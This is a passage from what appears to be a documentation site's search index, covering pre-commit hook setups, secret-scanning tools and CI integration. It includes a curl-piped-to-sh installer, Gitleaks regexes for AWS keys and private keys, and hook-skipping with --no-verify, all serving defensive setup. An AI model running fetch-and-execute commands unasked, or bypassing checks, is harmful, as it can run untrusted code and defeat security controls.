\"3.11\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\nignore_missing_imports = true\n\n[tool.flake8]\nmax-line-length = 120\nextend-ignore = [\"E203\", \"W503\"]\nmax-complexity = 10\ndocstring-convention = \"google\"\n\n[tool.bandit]\nexclude_dirs = [\"/tests\", \"/venv\"]\nskips = [\"B101\", \"B601\"]\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#javascript-typescript","title":"JavaScript / TypeScript","text":"<pre><code>repos:\n  # Formatting\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v3.1.0\n    hooks:\n      - id: prettier\n        types_or: [javascript, jsx, ts, tsx, json, yaml, markdown, html, css, scss]\n        additional_dependencies:\n          - prettier@3.1.0\n          - '@prettier/plugin-xml@3.2.2'\n          - 'prettier-plugin-organize-imports@3.2.4'\n\n  # Linting\n  - repo: https://github.com/pre-commit/mirrors-eslint\n    rev: v8.56.0\n    hooks:\n      - id: eslint\n        files: \\.[jt]sx?$\n        types: [file]\n        additional_dependencies:\n          - eslint@8.56.0\n          - eslint-config-airbnb-base@15.0.0\n          - eslint-config-airbnb-typescript@17.1.0\n          - eslint-plugin-import@2.29.1\n          - '@typescript-eslint/parser@6.18.1'\n          - '@typescript-eslint/eslint-plugin@6.18.1'\n        args: ['--fix', '--max-warnings=0']\n\n  # TypeScript type checking\n  - repo: local\n    hooks:\n      - id: tsc\n        name: TypeScript Compiler\n        entry: npx tsc --noEmit\n        language: system\n        files: \\.tsx?$\n        pass_filenames: false\n</code></pre> <p>.prettierrc.json:</p> <pre><code>{\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"tabWidth\": 2,\n  \"trailingComma\": \"es5\",\n  \"printWidth\": 100,\n  \"arrowParens\": \"always\",\n  \"endOfLine\": \"lf\"\n}\n</code></pre> <p>.eslintrc.json:</p> <pre><code>{\n  \"extends\": [\n    \"airbnb-base\",\n    \"airbnb-typescript/base\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:import/recommended\",\n    \"plugin:import/typescript\"\n  ],\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"project\": \"./tsconfig.json\"\n  },\n  \"rules\": {\n    \"no-console\": \"warn\",\n    \"@typescript-eslint/no-explicit-any\": \"error\",\n    \"import/prefer-default-export\": \"off\"\n  }\n}\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#terraform-terragrunt","title":"Terraform / Terragrunt","text":"<pre><code>repos:\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      # Format Terraform files\n      - id: terraform_fmt\n\n      # Validate Terraform syntax\n      - id: terraform_validate\n        args:\n          - '--hook-config=--retry-once-with-cleanup=true'\n          - '--tf-init-args=-backend=false'\n\n      # Generate/update README.md\n      - id: terraform_docs\n        args:\n          - '--hook-config=--path-to-file=README.md'\n          - '--hook-config=--add-to-existing-file=true'\n          - '--hook-config=--create-file-if-not-exist=true'\n          - '--args=--sort-by required'\n\n      # Lint with TFLint\n      - id: terraform_tflint\n        args:\n          - '--args=--config=__GIT_WORKING_DIR__/.tflint.hcl'\n          - '--args=--module'\n          - '--args=--enable-rule=terraform_deprecated_index'\n\n      # Security scanning with Trivy\n      - id: terraform_trivy\n        args:\n          - '--args=--severity=HIGH,CRITICAL'\n          - '--args=--skip-dirs=\"**/.terraform\"'\n          - '--args=--format=table'\n\n      # Security scanning with Checkov\n      - id: terraform_checkov\n        args:\n          - '--args=--quiet'\n          - '--args=--framework=terraform'\n          - '--args=--skip-check=CKV_AWS_*'\n\n      # Cost estimation (optional)\n      - id: infracost_breakdown\n        args:\n          - '--args=--path=.'\n        verbose: true\n</code></pre> <p>.tflint.hcl:</p> <pre><code>plugin \"aws\" {\n  enabled = true\n  version = \"0.29.0\"\n  source  = \"github.com/terraform-linters/tflint-ruleset-aws\"\n}\n\nrule \"terraform_naming_convention\" {\n  enabled = true\n}\n\nrule \"terraform_documented_variables\" {\n  enabled = true\n}\n\nrule \"terraform_module_pinned_source\" {\n  enabled = true\n}\n\nrule \"terraform_unused_declarations\" {\n  enabled = true\n}\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#ansible","title":"Ansible","text":"<pre><code>repos:\n  - repo: https://github.com/ansible/ansible-lint\n    rev: v6.22.2\n    hooks:\n      - id: ansible-lint\n        files: \\.(yaml|yml)$\n        args:\n          - '-c'\n          - '.ansible-lint'\n          - '--profile=production'\n          - '--exclude=.github/'\n</code></pre> <p>.ansible-lint:</p> <pre><code>## .ansible-lint\nprofile: production\n\nexclude_paths:\n  - .cache/\n  - .github/\n  - test/\n  - molecule/\n\nskip_list:\n  - yaml[line-length]\n  - name[casing]\n\nwarn_list:\n  - experimental\n  - role-name\n\n## Enable specific rules\nenable_list:\n  - args\n  - empty-string-compare\n  - no-log-password\n  - no-same-owner\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#shell-scripts","title":"Shell Scripts","text":"<pre><code>repos:\n  # Linting\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n        args:\n          - '--severity=warning'\n          - '--shell=bash'\n          - '--exclude=SC1091'  # Exclude sourcing errors\n\n  # Formatting\n  - repo: https://github.com/scop/pre-commit-shfmt\n    rev: v3.7.0-4\n    hooks:\n      - id: shfmt\n        args:\n          - '-i'\n          - '2'      # Indent with 2 spaces\n          - '-ci'    # Switch case indent\n          - '-bn'    # Binary ops at line start\n          - '-w'     # Write to file\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#docker","title":"Docker","text":"<pre><code>repos:\n  # Dockerfile linting\n  - repo: https://github.com/hadolint/hadolint\n    rev: v2.12.0\n    hooks:\n      - id: hadolint\n        args:\n          - '--ignore'\n          - 'DL3008'  # Pin versions in apt-get\n          - '--ignore'\n          - 'DL3009'  # Delete apt-get lists\n          - '--failure-threshold'\n          - 'warning'\n\n  # Docker Compose validation\n  - repo: https://github.com/IamTheFij/docker-pre-commit\n    rev: v3.0.1\n    hooks:\n      - id: docker-compose-check\n        args: ['-f', 'docker-compose.yml']\n</code></pre> <p>.hadolint.yaml:</p> <pre><code>## .hadolint.yaml\nignored:\n  - DL3008  # Pin versions in apt-get install\n  - DL3009  # Delete apt-get lists after installing\n\ntrustedRegistries:\n  - docker.io\n  - gcr.io\n  - ghcr.io\n\nfailure-threshold: warning\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#security-hooks","title":"Security Hooks","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#secret-detection","title":"Secret Detection","text":"<p>detect-secrets configuration:</p> <pre><code>repos:\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args:\n          - '--baseline'\n          - '.secrets.baseline'\n          - '--exclude-files'\n          - '\\.lock$'\n          - '--exclude-files'\n          - '\\.svg$'\n          - '--exclude-files'\n          - 'package-lock\\.json$'\n</code></pre> <p>Initialize baseline:</p> <pre><code>## Generate initial baseline\ndetect-secrets scan &gt; .secrets.baseline\n\n## Audit findings\ndetect-secrets audit .secrets.baseline\n\n## Update baseline after adding legitimate secrets\ndetect-secrets scan --baseline .secrets.baseline\n</code></pre> <p>.secrets.baseline example:</p> <pre><code>{\n  \"version\": \"1.4.0\",\n  \"filters_used\": [\n    {\n      \"path\": \"detect_secrets.filters.allowlist.is_line_allowlisted\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.common.is_ignored_due_to_verification_policies\",\n      \"min_level\": 2\n    }\n  ],\n  \"results\": {},\n  \"generated_at\": \"2025-12-01T10:00:00Z\"\n}\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#trufflehog-integration","title":"TruffleHog Integration","text":"<pre><code>repos:\n  - repo: https://github.com/trufflesecurity/trufflehog\n    rev: v3.63.7\n    hooks:\n      - id: trufflehog\n        name: TruffleHog Secret Scan\n        entry: trufflehog\n        args:\n          - '--no-update'\n          - 'filesystem'\n          - '.'\n          - '--exclude-paths'\n          - '.trufflehog-exclude.txt'\n          - '--fail'\n          - '--json'\n</code></pre> <p>.trufflehog-exclude.txt:</p> <pre><code>## Exclude common false positives\n**/*.lock\n**/*.min.js\n**/*.svg\n**/node_modules/**\n**/.git/**\n**/dist/**\n**/build/**\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#gitleaks-alternative","title":"Gitleaks Alternative","text":"<pre><code>repos:\n  - repo: https://github.com/gitleaks/gitleaks\n    rev: v8.18.1\n    hooks:\n      - id: gitleaks\n        args: ['--verbose', '--config', '.gitleaks.toml']\n</code></pre> <p>.gitleaks.toml:</p> <pre><code>[extend]\nuseDefault = true\n\n[[rules]]\nid = \"custom-api-key\"\ndescription = \"Custom API Key Pattern\"\nregex = '''(?i)api[_-]?key[_-]?=[\"']?[a-z0-9]{32,}[\"']?'''\ntags = [\"api\", \"key\"]\n\n[allowlist]\npaths = [\n  '''(.*?)(jpg|gif|doc|pdf|bin)$''',\n  '''node_modules/''',\n]\n\ncommits = [\n  \"commit-hash-to-ignore\"\n]\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#custom-hooks","title":"Custom Hooks","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#local-custom-hooks","title":"Local Custom Hooks","text":"<p>Create local hooks for project-specific checks:</p> <pre><code>repos:\n  - repo: local\n    hooks:\n      # Custom Python imports check\n      - id: check-python-imports\n        name: Check Python Import Order\n        entry: python scripts/check_imports.py\n        language: system\n        files: \\.py$\n        pass_filenames: true\n\n      # Custom license header check\n      - id: check-license-headers\n        name: Check License Headers\n        entry: bash scripts/check_license.sh\n        language: system\n        files: \\.(py|ts|js|sh)$\n\n      # Custom TODO tracker\n      - id: check-todos\n        name: Check TODO Format\n        entry: python scripts/check_todos.py\n        language: system\n        files: \\.(py|ts|js|md)$\n\n      # Custom metadata validation\n      - id: validate-metadata\n        name: Validate YAML Frontmatter\n        entry: python scripts/validate_metadata.py\n        language: system\n        files: \\.md$\n</code></pre> <p>scripts/check_imports.py:</p> <pre><code>#!/usr/bin/env python3\n\"\"\"Check that Python imports follow project conventions.\"\"\"\nimport sys\nfrom pathlib import Path\n\ndef check_imports(filepath: Path) -&gt; bool:\n    \"\"\"Check import order and style.\"\"\"\n    content = filepath.read_text()\n    lines = content.split('\\n')\n\n    issues = []\n\n    # Check for relative imports in src/\n    if 'src/' in str(filepath):\n        for i, line in enumerate(lines, 1):\n            if line.strip().startswith('from .'):\n                issues.append(f\"{filepath}:{i}: Avoid relative imports in src/\")\n\n    # Check for wildcard imports\n    for i, line in enumerate(lines, 1):\n        if 'import *' in line:\n            issues.append(f\"{filepath}:{i}: Avoid wildcard imports\")\n\n    if issues:\n        for issue in issues:\n            print(issue, file=sys.stderr)\n        return False\n\n    return True\n\nif __name__ == '__main__':\n    files = [Path(f) for f in sys.argv[1:]]\n    all_passed = all(check_imports(f) for f in files)\n    sys.exit(0 if all_passed else 1)\n</code></pre> <p>scripts/check_license.sh:</p> <pre><code>#!/bin/bash\n## Check that all source files have license headers\n\nEXIT_CODE=0\n\nfor file in \"$@\"; do\n  if ! head -n 5 \"$file\" | grep -q \"Copyright\"; then\n    echo \"ERROR: Missing license header in $file\" &gt;&amp;2\n    EXIT_CODE=1\n  fi\ndone\n\nexit $EXIT_CODE\n</code></pre> <p>scripts/check_todos.py:</p> <pre><code>#!/usr/bin/env python3\n\"\"\"Validate TODO comment format.\"\"\"\nimport re\nimport sys\nfrom pathlib import Path\n\n## Required format: TODO(username): Description [TICKET-123]\nTODO_PATTERN = re.compile(r'TODO\\([a-z]+\\):\\s+.+\\s+\\[[A-Z]+-\\d+\\]')\n\ndef check_todos(filepath: Path) -&gt; bool:\n    \"\"\"Check TODO comments follow project convention.\"\"\"\n    content = filepath.read_text()\n    lines = content.split('\\n')\n\n    issues = []\n\n    for i, line in enumerate(lines, 1):\n        if 'TODO' in line and not TODO_PATTERN.search(line):\n            issues.append(\n                f\"{filepath}:{i}: TODO must follow format: \"\n                \"TODO(username): Description [TICKET-123]\"\n            )\n\n    if issues:\n        for issue in issues:\n            print(issue, file=sys.stderr)\n        return False\n\n    return True\n\nif __name__ == '__main__':\n    files = [Path(f) for f in sys.argv[1:]]\n    all_passed = all(check_todos(f) for f in files)\n    sys.exit(0 if all_passed else 1)\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#hook-with-dependencies","title":"Hook with Dependencies","text":"<pre><code>repos:\n  - repo: local\n    hooks:\n      - id: pytest-check\n        name: Run Fast Tests\n        entry: pytest tests/unit -v --maxfail=1\n        language: system\n        pass_filenames: false\n        always_run: true\n        stages: [commit]\n\n      - id: integration-tests\n        name: Run Integration Tests\n        entry: pytest tests/integration -v\n        language: system\n        pass_filenames: false\n        stages: [pre-push]\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#cicd-integration","title":"CI/CD Integration","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#github-actions","title":"GitHub Actions","text":"<p>.github/workflows/pre-commit.yml:</p> <pre><code>name: Pre-commit Checks\n\non:\n  pull_request:\n  push:\n    branches: [main, develop]\n\njobs:\n  pre-commit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - uses: pre-commit/action@v3.0.0\n        with:\n          extra_args: --all-files --show-diff-on-failure\n\n      - name: Upload pre-commit cache\n        if: always()\n        uses: actions/cache@v3\n        with:\n          path: ~/.cache/pre-commit\n          key: pre-commit-${{ hashFiles('.pre-commit-config.yaml') }}\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#gitlab-ci","title":"GitLab CI","text":"<p>.gitlab-ci.yml:</p> <pre><code>pre-commit:\n  stage: validate\n  image: python:3.11-slim\n  cache:\n    key: pre-commit-cache\n    paths:\n      - .pre-commit-cache/\n  before_script:\n    - pip install pre-commit\n    - export PRE_COMMIT_HOME=.pre-commit-cache\n  script:\n    - pre-commit run --all-files --show-diff-on-failure\n  only:\n    - merge_requests\n    - main\n    - develop\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#jenkins","title":"Jenkins","text":"<pre><code>stage('Pre-commit Checks') {\n    agent {\n        docker {\n            image 'python:3.11-slim'\n        }\n    }\n    steps {\n        sh '''\n            pip install pre-commit\n            pre-commit run --all-files --show-diff-on-failure\n        '''\n    }\n}\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#performance-optimization","title":"Performance Optimization","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#parallel-execution","title":"Parallel Execution","text":"<p>Run independent hooks in parallel:</p> <pre><code>repos:\n  # These hooks can run in parallel\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        require_serial: false  # Allow parallel execution\n\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.0.0\n    hooks:\n      - id: flake8\n        require_serial: false\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#skip-slow-hooks-locally","title":"Skip Slow Hooks Locally","text":"<p>Use environment variables to skip expensive checks during development:</p> <pre><code>## Skip expensive hooks locally\nSKIP=mypy,bandit,terraform_trivy git commit -m \"WIP: feature development\"\n\n## Skip all hooks (emergency only)\ngit commit --no-verify -m \"hotfix: critical bug\"\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#staged-hooks","title":"Staged Hooks","text":"<p>Run different hooks at different stages:</p> <pre><code>repos:\n  # Fast checks on every commit\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n        stages: [commit]\n\n  # Moderate checks before commit\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        stages: [commit]\n\n  # Expensive checks on pre-push only\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        stages: [pre-push]\n\n  # Critical checks before manual stage\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.6\n    hooks:\n      - id: bandit\n        stages: [manual]\n</code></pre> <p>Enable pre-push hooks:</p> <pre><code>pre-commit install --hook-type pre-push\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#file-filtering","title":"File Filtering","text":"<p>Only run hooks on relevant files:</p> <pre><code>repos:\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        files: '^src/.*\\.py$'        # Only run on src/**/*.py\n        exclude: '^tests/.*$'        # Exclude tests/\n\n  - repo: https://github.com/hadolint/hadolint\n    rev: v2.12.0\n    hooks:\n      - id: hadolint\n        files: '^.*Dockerfile.*$'    # Match Dockerfile variants\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#troubleshooting","title":"Troubleshooting","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#common-issues","title":"Common Issues","text":"<p>Hook fails with \"command not found\":</p> <pre><code>## Solution 1: Install the tool globally\npip install black flake8 mypy\n\n## Solution 2: Use language_version to specify Python\nrepos:\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.11\n</code></pre> <p>Hook modifies files, causing re-run:</p> <pre><code>## This is expected behavior - hooks auto-fix and re-stage\n## Just run git commit again after hooks modify files\n\n## If you want to see what changed:\ngit diff\n</code></pre> <p>Hooks take too long:</p> <pre><code>## Run only on changed files (default)\npre-commit run\n\n## Skip specific hooks\nSKIP=mypy,bandit git commit -m \"message\"\n\n## Move expensive hooks to pre-push\n## See \"Staged Hooks\" section above\n</code></pre> <p>Hook cache issues:</p> <pre><code>## Clean pre-commit cache\npre-commit clean\n\n## Reinstall all hooks\npre-commit uninstall\npre-commit install\n\n## Clear specific hook cache\nrm -rf ~/.cache/pre-commit/repo*\n</code></pre> <p>Python version mismatch:</p> <pre><code>repos:\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.11  # Force specific version\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#debug-mode","title":"Debug Mode","text":"<pre><code>## Run with verbose output\npre-commit run --verbose --all-files\n\n## Debug specific hook\npre-commit run black --verbose\n\n## Show hook execution environment\npre-commit run --hook-stage manual --all-files -v\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#updating-hooks","title":"Updating Hooks","text":"<pre><code>## Update all hooks to latest versions\npre-commit autoupdate\n\n## Update specific hooks\npre-commit autoupdate --repo https://github.com/psf/black\n\n## Freeze at current versions (for reproducibility)\npre-commit autoupdate --freeze\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#best-practices","title":"Best Practices","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#development-workflow","title":"Development Workflow","text":"<ol> <li>Install hooks immediately:</li> </ol> <pre><code>git clone repo &amp;&amp; cd repo\npre-commit install --install-hooks\n</code></pre> <ol> <li>Run on all files initially:</li> </ol> <pre><code>pre-commit run --all-files\n</code></pre> <ol> <li>Commit hook configuration:</li> </ol> <pre><code>git add .pre-commit-config.yaml\ngit commit -m \"chore: add pre-commit hooks\"\n</code></pre> <ol> <li>Update regularly:</li> </ol> <pre><code>pre-commit autoupdate\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#team-adoption","title":"Team Adoption","text":"<ol> <li>Document in README.md:</li> </ol> <pre><code>## Development Setup\n\nInstall pre-commit hooks:\n\n```bash\npre-commit install\n```\n</code></pre> <ol> <li> <p>Add to CI/CD (see CI/CD Integration section)</p> </li> <li> <p>Provide escape hatch:</p> </li> </ol> <pre><code># For emergencies only\ngit commit --no-verify -m \"hotfix\"\n</code></pre> <ol> <li>Keep hooks fast - move slow checks to pre-push</li> </ol>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#hook-organization","title":"Hook Organization","text":"<ol> <li>Fast checks first - fail fast principle</li> <li>Group by type - formatting, linting, security</li> <li>Clear hook names - use descriptive IDs</li> <li>Document custom hooks - add comments explaining purpose</li> </ol>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#resources","title":"Resources","text":"<ul> <li>Pre-commit Official Docs</li> <li>Pre-commit Hooks Repository</li> <li>Supported Hooks List</li> <li>Creating Custom Hooks</li> </ul> <p>Next Steps:</p> <ul> <li>Review the AI Validation Pipeline for comprehensive CI/CD integration</li> <li>See GitHub Actions Guide for GitHub-specific CI setup</li> <li>Check GitLab CI Guide for GitLab-specific patterns</li> </ul>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/security_scanning_guide/","title":"Security Scanning Guide","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#introduction","title":"Introduction","text":"<p>This guide provides comprehensive coverage of security scanning tools and practices for DevSecOps pipelines. It covers static analysis (SAST), dynamic analysis (DAST), software composition analysis (SCA), secret detection, container scanning, infrastructure scanning, and compliance validation.</p>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Secret Detection</li> <li>Static Application Security Testing (SAST)</li> <li>Software Composition Analysis (SCA)</li> <li>Container Security</li> <li>Infrastructure Security</li> <li>Dynamic Application Security Testing (DAST)</li> <li>Compliance Scanning</li> <li>CI/CD Integration</li> <li>Security Policies</li> </ol>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#secret-detection","title":"Secret Detection","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#detect-secrets","title":"detect-secrets","text":"<p>Installation:</p> <pre><code>## Using pipx\npipx install detect-secrets\n\n## Verify\ndetect-secrets --version\n</code></pre> <p>Initialize baseline:</p> <pre><code>## Scan current repository\ndetect-secrets scan &gt; .secrets.baseline\n\n## Audit findings\ndetect-secrets audit .secrets.baseline\n\n## Update baseline\ndetect-secrets scan --baseline .secrets.baseline\n</code></pre> <p>.secrets.baseline configuration:</p> <pre><code>{\n  \"version\": \"1.4.0\",\n  \"filters_used\": [\n    {\n      \"path\": \"detect_secrets.filters.allowlist.is_line_allowlisted\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.common.is_ignored_due_to_verification_policies\",\n      \"min_level\": 2\n    },\n    {\n      \"path\": \"detect_secrets.filters.heuristic.is_indirect_reference\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.heuristic.is_likely_id_string\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.heuristic.is_potential_uuid\"\n    }\n  ],\n  \"results\": {},\n  \"generated_at\": \"2025-12-01T10:00:00Z\"\n}\n</code></pre> <p>Pre-commit integration:</p> <pre><code>repos:\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args:\n          - '--baseline'\n          - '.secrets.baseline'\n          - '--exclude-files'\n          - '\\.lock$'\n          - '--exclude-files'\n          - 'package-lock\\.json$'\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#trufflehog","title":"TruffleHog","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install trufflesecurity/trufflehog/trufflehog\n\n## Linux\ncurl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | \\\n  sh -s -- -b /usr/local/bin\n\n## Verify\ntrufflehog --version\n</code></pre> <p>Scan filesystem:</p> <pre><code>## Scan current directory\ntrufflehog filesystem . --json\n\n## Scan with exclusions\ntrufflehog filesystem . \\\n  --exclude-paths .trufflehog-exclude.txt \\\n  --json\n\n## Scan specific branch\ntrufflehog git file://. \\\n  --branch main \\\n  --json\n</code></pre> <p>.trufflehog-exclude.txt:</p> <pre><code>## Dependency directories\nnode_modules/\n.venv/\nvendor/\n\n## Build outputs\ndist/\nbuild/\n*.min.js\n\n## Lock files\npackage-lock.json\nyarn.lock\nPipfile.lock\n\n## Images\n*.svg\n*.png\n*.jpg\n</code></pre> <p>CI/CD integration:</p> <pre><code>## GitHub Actions\n- name: TruffleHog Secret Scan\n  uses: trufflesecurity/trufflehog@main\n  with:\n    path: ./\n    base: ${{ github.event.repository.default_branch }}\n    head: HEAD\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#gitleaks","title":"Gitleaks","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install gitleaks\n\n## Linux\nwget https://github.com/gitleaks/gitleaks/releases/download/v8.18.1/gitleaks_8.18.1_linux_x64.tar.gz\ntar xvzf gitleaks_8.18.1_linux_x64.tar.gz\nsudo mv gitleaks /usr/local/bin/\n\n## Verify\ngitleaks version\n</code></pre> <p>Configuration (.gitleaks.toml):</p> <pre><code>title = \"Gitleaks Configuration\"\n\n[extend]\nuseDefault = true\n\n[[rules]]\nid = \"generic-api-key\"\ndescription = \"Generic API Key\"\nregex = '''(?i)(api[_-]?key|apikey)[_-]?[:=]\\s*['\"]?([a-z0-9]{32,})['\"]?'''\ntags = [\"api\", \"key\"]\n\n[[rules]]\nid = \"aws-access-key\"\ndescription = \"AWS Access Key ID\"\nregex = '''(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'''\ntags = [\"aws\", \"credentials\"]\n\n[[rules]]\nid = \"private-key\"\ndescription = \"Private Key\"\nregex = '''-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----'''\ntags = [\"private-key\"]\n\n[allowlist]\ndescription = \"Allowlist\"\npaths = [\n  '''\\.lock$''',\n  '''node_modules/''',\n  '''\\.min\\.js$''',\n]\n\ncommits = [\n  # Add commit hashes to ignore\n]\n\nregexes = [\n  '''example\\.com''',\n  '''placeholder''',\n]\n</code></pre> <p>Scanning:</p> <pre><code>## Scan entire repository history\ngitleaks detect --source . --verbose\n\n## Scan specific commit range\ngitleaks detect --source . --log-opts=\"HEAD~10..HEAD\"\n\n## Scan uncommitted changes\ngitleaks protect --staged\n\n## Generate report\ngitleaks detect --report-path gitleaks-report.json --report-format json\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#static-application-security-testing-sast","title":"Static Application Security Testing (SAST)","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#sonarqubesonarcloud","title":"SonarQube/SonarCloud","text":"<p>Installation (SonarQube):</p> <pre><code>## Docker\ndocker run -d --name sonarqube \\\n  -p 9000:9000 \\\n  sonarqube:lts-community\n\n## Access at http://localhost:9000\n## Default credentials: admin/admin\n</code></pre> <p>Scanner installation:</p> <pre><code>## macOS\nbrew install sonar-scanner\n\n## Linux\nwget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-5.0.1.3006-linux.zip\nunzip sonar-scanner-cli-5.0.1.3006-linux.zip\nsudo mv sonar-scanner-5.0.1.3006-linux /opt/sonar-scanner\nexport PATH=$PATH:/opt/sonar-scanner/bin\n</code></pre> <p>sonar-project.properties:</p> <pre><code>sonar.projectKey=my-project\nsonar.projectName=My Project\nsonar.projectVersion=1.0\n\n## Source directories\nsonar.sources=src\nsonar.tests=tests\n\n## Exclude patterns\nsonar.exclusions=**/node_modules/**,**/dist/**,**/*.test.ts\n\n## Language-specific settings\nsonar.python.version=3.11\nsonar.javascript.node.maxspace=4096\n\n## Coverage 